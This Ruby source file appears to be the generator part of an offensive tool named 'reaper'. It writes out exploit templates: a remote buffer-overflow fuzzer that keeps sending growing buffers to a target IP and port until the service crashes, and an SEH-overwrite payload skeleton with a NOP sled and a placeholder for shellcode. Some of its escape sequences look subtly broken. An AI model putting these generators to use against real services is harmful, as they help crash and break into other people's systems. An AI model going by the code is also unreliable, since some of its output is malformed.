require 'optparse'

module Generate
  class Content
    protected
      def self.get_remote_content
        "#!/usr/bin/ruby\n\n# Basic buffer overflow Example\nrequire 'socket'\n\n# Get Argument Target IP and Port\ntarget = ARGF.argv[0]\nport = ARGF.argv[1]\n\n# Compact IP/Port\nsocket_addr = Socket.pack_sockaddr_in(port, target)\n\n# Simple buffer of A's\nbuff = 'x41'*50\n\nwhile true\n\tbegin\n\t\t# Create new socket to connect C style\n\t\ts = Socket.new(:INET, :STREAM, 0)\n\t\ts.settimeout(2)\n\n\t\t#connect\n\t\ts.connect(socket_addr)\n\t\ts.recv(1024)\n\t\tputs "+'"Sending buffer with length #{buff.length.to_s}"'+"\n\t\ts.send("+'"User #{buff}rn", 0'+")\n\t\ts.close()\n\t\tsleep(1)\n\n\t\tbuff = buff + 'x41'*50\n\trescue\n\t\tputs "+'"[+] Crash occured with buffer length #{(buff.length - 50).to_s}"'+"\n\t\texit\n\tend\nend"
      end

      def self.get_payload_content
        "#!/usr/bin/ruby\n\n # Basic Payload Example\nfilename = 'ENTER INFO'\n\nshellcode= ( )\n\nOFFSET = # Enter NUM\nBYTES =  # Enter NUM\n\nnops =" + '"\x90"' + "*20 + shellcode\n\n# Designed to deal with SEH (POP,POP,RET)\nbuffer ="+'"A"' + "* OFFSET + " + '"SEH" ' + "+ " + '"nSEH" ' + "+ nops + " + '"B" '+ "* (BYTES - nops.length)\n\nFile.open(filename, 'w+') { |f| f.write(buffer) }"
      end
  end

  class Options < Content

    def self.parse(args)
      options = {}
      parser = OptionParser.new do |opt|
        opt.banner = "Usage: reaper gen [options]\nExample: reaper gen -r <filename>"
        opt.separator ''
        opt.separator 'Options:'
        opt.on('-r', '--remote-exploit <filename>', String, "Generate a remote exploit file") do |file|
          options[:filename] = file
          # Return String from get_remote_content
          set_string(get_remote_content)
        end

        opt.on('-p', '--payload <filename>', String, "Generate a payload file") do |file|
          options[:filename] = file
          # Return String from get_payload_content
          set_string(get_payload_content)
        end

        opt.on_tail('-h', '--help', 'Show this message') do
          $stdout.puts opt
          exit
        end
      end

      parser.parse!(args)

      raise OptionParser::MissingArgument, 'No options set, try -h for usage' if options.empty?
      options
    end

    def self.set_string(string)
      @string = string
    end

    def self.get_string
      @string
    end
  end

  class Driver
    def initialize
      begin
        @opts = Options.parse(ARGV)
      rescue OptionParser::ParseError => e
        $stderr.puts "[x] #{e.message}"
        exit
      end
    end

    def run
      File.open("#{@opts[:filename]}.rb", "w+") {|f| f.write(Options.get_string) }
    end
  end
end

@driver = Generate::Driver.new
begin
	@driver.run
rescue ::StandardError => e
  $stderr.puts "[x] #{e.class}: #{e.message}"
end
